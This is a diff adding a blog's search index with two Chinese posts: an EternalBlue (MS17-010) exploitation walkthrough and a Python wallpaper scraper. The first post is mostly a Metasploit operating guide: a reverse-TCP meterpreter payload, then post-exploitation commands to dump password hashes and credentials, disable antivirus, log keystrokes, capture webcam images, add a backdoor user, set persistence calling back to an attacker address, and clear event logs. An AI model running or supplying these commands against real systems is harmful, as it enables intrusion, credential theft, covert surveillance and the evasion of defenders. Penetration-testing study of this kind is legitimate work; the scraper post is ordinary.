@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>永恒之蓝漏洞复现(ms17-010)</title>
+    <link href="/2022/04/19/hello-world/"/>
+    <url>/2022/04/19/hello-world/</url>
+    
+    <content type="html"><![CDATA[<h1 id="永恒之蓝漏洞复现-ms17-010"><a href="#永恒之蓝漏洞复现-ms17-010" class="headerlink" title="永恒之蓝漏洞复现(ms17-010)"></a>永恒之蓝漏洞复现(ms17-010)</h1><p>搜集信息查询网址开放IP以及端口</p><p>nmap扫描端口 判断系统类型</p><p><strong>查看漏洞模块****——search ms17-010</strong></p><p><strong>辅助扫描模块</strong> <strong>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong></p><p><strong>攻击模块</strong> <strong>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong></p><p>开启 set ForceExploit true</p><p>设置payload，这里用set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set RHOST 目标主机地址</p><p>set THREADS 512 设置线程</p><h2 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post****后渗透模块"></a><strong>Post****后渗透模块</strong></h2><p>sysinfo       #查看目标主机系统信息</p><p>run scraper     #查看目标主机详细信息</p><p>run hashdump     #导出密码的哈希</p><p>load kiwi      #加载</p><p>ps          #查看目标主机进程信息</p><p>pwd         #查看目标当前目录(windows)</p><p>getlwd        #查看目标当前目录(Linux)</p><p>search -f *.jsp -d e:\         #搜索E盘中所有以.jsp为后缀的文件</p><p>download e:\test.txt &#x2F;root      #将目标机的e:\test.txt文件下载到&#x2F;root目录下</p><p>upload  &#x2F;root&#x2F;test.txt d:\test    #将&#x2F;root&#x2F;test.txt上传到目标机的 d:\test\ 目录下getpid        #查看当前Meterpreter Shell的进程</p><p>PIDmigrate 1384   #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</p><p>idletime       #查看主机运行时间</p><p>getuid        #查看获取的当前权限</p><p>getsystem      #提权</p><p>run killav     #关闭杀毒软件</p><p>screenshot      #截图</p><p>webcam_list     #查看目标主机的摄像头</p><p>webcam_snap     #拍照</p><p>webcam_stream    #开视频</p><p>execute 参数 -f 可执行文件  #执行可执行程序</p><p>run getgui -u hack -p 123   #创建hack用户，密码为123</p><p>run getgui -e         #开启远程桌面</p><p>keyscan_start         #开启键盘记录功能</p><p>keyscan_dump         #显示捕捉到的键盘记录信息</p><p>keyscan_stop         #停止键盘记录功能</p><p>uictl disable keyboard   #禁止目标使用键盘</p><p>uictl enable  keyboard   #允许目标使用键盘</p><p>uictl disable mouse     #禁止目标使用鼠标</p><p>uictl enable  mouse     #允许目标使用鼠标</p><p>load             #使用扩展库</p><p>run             #使用扩展库</p><p>run persistence -X -i 5 -p 8888 -r 192.168.10.27     #反弹时间间隔是5s 会自动连接</p><p>​                  192.168.27的4444端口，缺点是容易被杀毒软件查杀</p><p>portfwd add -l 3389 -r 192.168.11.13 -p 3389   #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</p><p>clearev            #清除日志</p><p>run post&#x2F;windows&#x2F;manage&#x2F;migrate          #自动进程迁移   </p><p>run post&#x2F;windows&#x2F;gather&#x2F;checkvm          #查看目标主机是否运行在虚拟机上   </p><p>run post&#x2F;windows&#x2F;manage&#x2F;killav          #关闭杀毒软件   </p><p>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp        #开启远程桌面服务   </p><p>run post&#x2F;windows&#x2F;manage&#x2F;autoroute         #查看路由信息   </p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users   #列举当前登录的用户   </p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications     #列举应用程序   </p><p>run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码   </p><p>run windows&#x2F;gather&#x2F;smart_hashdump         #dump出所有用户的hash</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Python爬取4k精美壁纸</title>
+    <link href="/2022/04/19/%E7%88%AC%E8%99%AB/"/>
+    <url>/2022/04/19/%E7%88%AC%E8%99%AB/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Python爬取4k精美壁纸"><a href="#Python爬取4k精美壁纸" class="headerlink" title="Python爬取4k精美壁纸"></a>Python爬取4k精美壁纸</h1><p>因为想做一个幻灯片壁纸，网上下载素材太慢，于是利用<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">爬虫</a>获取了一批壁纸到本地</p><p>目标地址 <a href="http://www.netbian.com/index.htm">http://www.netbian.com/index.htm</a></p><div class="hljs code-wrapper"><pre><code class="hljs">#首先导入所需的库import requestsfrom bs4 import BeautifulSoup   import timefor i in range(2,200):    #爬取第2页到第200页的壁纸    url = f&quot;http://www.netbian.com/index_&#123;i&#125;.htm&quot;    headers = &#123;        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&quot;    &#125;    resp = requests.get(url,headers=headers)    print(url)    resp.encoding = &quot;GBK&quot;    #处理乱码    href1 = str(&quot;&quot;)    href = str(&quot;&quot;)    #将源码转发给bs4    main_page = BeautifulSoup(resp.text,&quot;html.parser&quot;)    alist = main_page.find(&quot;div&quot;,class_=&quot;list&quot;).find_all(&quot;a&quot;)  #把范围第一次缩小    print(alist)    for a in alist:        href = (a.get(&quot;href&quot;))        if href != &quot;http://pic.netbian.com/&quot;:        #print(&quot;http://www.netbian.com/&quot;+href)        #拿子页面的源代码           urlmix = requests.get(&quot;http://www.netbian.com/&quot;+href)           urlmix.encoding = &quot;GBK&quot;           urlmix_text = urlmix.text           main_page1 = BeautifulSoup(urlmix_text,&quot;html.parser&quot;)           urlmix_s = main_page1.find(&quot;div&quot;,class_=&quot;endpage&quot;)           img = urlmix_s.find(&quot;img&quot;)           src = (img.get(&quot;src&quot;))#下载图片           img_resp = requests.get(src)           img_resp.content #拿到的是源代码           img_name = src.split(&quot;/&quot;)[-1]           with open(img_name,mode=&quot;wb&quot;) as f:            f.write(img_resp.content) #图片内容写入文件            time.sleep(1)    #这里设置一秒防止ip被过滤            print(&quot;over&quot;,img_name)print(&quot;game over &quot;)</code></pre></div><p>效果如下</p><p><img src="/%5Cpic%5Cpacong.png" alt="pacong"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  
+</search>
